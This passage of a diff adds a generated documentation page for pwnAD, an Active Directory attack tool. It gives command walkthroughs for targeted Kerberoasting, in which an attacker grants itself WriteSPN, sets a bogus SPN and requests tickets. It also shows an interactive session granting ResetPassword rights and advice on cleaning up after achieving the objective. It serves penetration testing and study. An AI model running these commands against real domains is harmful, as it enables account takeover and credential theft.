+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Cleanup</span>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteKeyCredentialLink
+</code></pre></div>
+<h3 id="scenario-5-targeted-kerberoasting">Scenario 5: Targeted Kerberoasting</h3>
+<p>Set an SPN on a user account to kerberoast it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Grant WriteSPN right</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteSPN
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Add an SPN</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>modify<span class="w"> </span>user<span class="w"> </span>targetuser<span class="w"> </span>--spn<span class="w"> </span><span class="s2">&quot;HTTP/pwned.domain.local&quot;</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># Kerberoast</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>GetUserSPNs.py<span class="w"> </span>domain.local/attacker:<span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-request
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1"># Cleanup</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>modify<span class="w"> </span>user<span class="w"> </span>targetuser<span class="w"> </span>--spn<span class="w"> </span><span class="s2">&quot;&quot;</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteSPN
+</code></pre></div>
+<h2 id="interactive-mode">Interactive Mode</h2>
+<p>All DACL operations work in interactive mode:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>pwnAD<span class="w"> </span>-i<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>pwnAD<span class="w"> </span><span class="o">[</span>domain.local<span class="se">\a</span>dmin<span class="o">]</span>&gt;<span class="w"> </span>dacl<span class="w"> </span><span class="nb">read</span><span class="w"> </span>targetuser
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>pwnAD<span class="w"> </span><span class="o">[</span>domain.local<span class="se">\a</span>dmin<span class="o">]</span>&gt;<span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>ResetPassword
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>domain.local<span class="se">\a</span>dmin<span class="o">]</span>&gt;<span class="w"> </span>dacl<span class="w"> </span>backup<span class="w"> </span>targetuser
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>pwnAD<span class="w"> </span><span class="o">[</span>domain.local<span class="se">\a</span>dmin<span class="o">]</span>&gt;<span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker
+</code></pre></div>
+<h2 id="troubleshooting">Troubleshooting</h2>
+<h3 id="cannot-read-ntsecuritydescriptor-attribute-insufficient-permissions">"Cannot read nTSecurityDescriptor attribute (insufficient permissions?)"</h3>
+<p>You don't have read access to the security descriptor. Ensure you have:
+- Read permission on the target object
+- At minimum, <code>READ_CONTROL</code> access</p>
+<h3 id="access-denied-when-writing">"Access denied" when writing</h3>
+<p>You don't have write permission to modify the DACL. You need:
+- <code>WRITE_DACL</code> permission on the target
+- Or ownership of the object</p>
+<h3 id="unknown-right-xxx">"Unknown right: xxx"</h3>
+<p>The specified right is not recognized. Use one of the predefined rights from the Available Rights table.</p>
+<h3 id="no-matching-aces-found-for-principal">"No matching ACEs found for principal"</h3>
+<p>When trying to remove ACEs, no ACEs were found matching your criteria. Verify:
+- The principal name/SID is correct
+- The principal actually has ACEs on the target
+- If using <code>--right</code>, that specific right exists for the principal</p>
+<h3 id="object-not-found">"Object not found"</h3>
+<p>The target object doesn't exist. Check:
+- Spelling of sAMAccountName
+- DN format if using distinguished name
+- User exists in the domain</p>
+<h2 id="best-practices">Best Practices</h2>
+<ol>
+<li><strong>Always backup before modifying</strong> - Use <code>dacl backup</code> before any write operation</li>
+<li><strong>Clean up after operations</strong> - Remove added ACEs after achieving your objective</li>
+<li><strong>Use specific rights</strong> - Prefer specific rights (like <code>ResetPassword</code>) over broad ones (like <code>GenericAll</code>)</li>
+<li><strong>Verify changes</strong> - Use <code>dacl read</code> to confirm your modifications</li>
+<li><strong>Document changes</strong> - Keep track of what ACEs you've added for proper cleanup</li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/dacledit.py">dacledit.py - Impacket</a></li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html">BloodHound Edges</a></li>
+<li><a href="https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-900de0b03e9a">An ACE Up the Sleeve - SpecterOps</a></li>
+<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/">MS-ADTS - Security Descriptors</a></li>
+<li><a href="https://adsecurity.org/?p=3658">AD Security - DACL Abuse</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/LightxR/pwnAD" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
